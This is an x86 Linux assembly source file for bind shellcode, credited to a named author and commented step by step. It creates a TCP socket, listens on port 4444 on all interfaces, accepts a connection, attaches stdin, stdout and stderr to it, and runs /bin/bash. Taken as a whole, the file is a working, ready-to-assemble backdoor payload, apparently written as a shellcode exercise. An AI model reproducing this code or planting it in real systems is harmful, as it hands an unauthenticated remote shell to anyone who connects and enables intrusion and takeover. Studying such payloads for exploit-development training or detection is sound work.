; Filename: shell_bind_tcp_v2.asm
; Author: Simon Lemire / 2018
; Description: Bind shellcode on port 4444, executes a shell
; Note: Uses socket, bind, listen & accept syscalls

global _start

section .text

_start:

	; Zero registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; Create socket
	mov ax, 0x167		; sys_socket
	mov bl, 0x2			; int domain -> AF_INET
	inc ecx				; int type -> SOCK_STREAM
	mov dl, 0x6			; int protocol -> IPPROTO_TCP
	int 0x80			; sys_socket
	mov edi, eax		; save socket fd

	; Create addr struct
	xor edx, edx
	push edx			; NULL padding
	push edx			; NULL padding
	push edx			; sin.addr (0.0.0.0)
	push word 0x5c11	; Port
	push word 0x2		; AF_INET
	mov esi, esp

	; Bind socket
	mov ax, 0x169		; sys_bind
	mov ebx, edi		; int sockfd -> saved socket fd
	mov ecx, esi		; const struct sockaddr *addr
	mov dl, 0x10		; socklen_t addrlen
	int 0x80			; sys_bind

	; Listen for connection
	mov ax, 0x16b		; sys_listen
	mov ebx, edi		; int sockfd -> saved socket fd
	xor ecx, ecx		; int backlog -> NULL
	int 0x80			; sys_socketcall (SYS_LISTEN)

	; Accept connection
	mov ax, 0x16c		; sys_accept4
	mov ebx, edi		; int sockfd -> saved sock fd value
	xor ecx, ecx		; struct sockaddr *addr -> NULL
	xor edx, edx		; socklen_t *addrlen -> NULL
	xor esi, esi
	int 0x80	 		; sys_socketcall (SYS_ACCEPT)
	mov edi, eax		; save the new fd

	; Redirect STDIN, STDOUT, STDERR to socket
	xor ecx, ecx
	mov cl, 0x3			; counter for loop (stdin to stderr)
	mov ebx, edi		; socket fd

	dup2:
	mov al, 0x3f		; sys_dup2
	dec ecx	
	int 0x80			; sys_dup2
	inc ecx
	loop dup2

	; execve()
	xor eax, eax
	push 0x41687361		; ///bin/bashA
	push 0x622f6e69
	push 0x622f2f2f
	mov byte [esp + 11], al	; NULL terminate string
	mov al, 0xb			; sys_execve
	mov ebx, esp		; const char *filename
	xor ecx, ecx 		; char *const argv[]
	xor edx, edx		; char *const envp[]
	int 0x80			; sys_execve
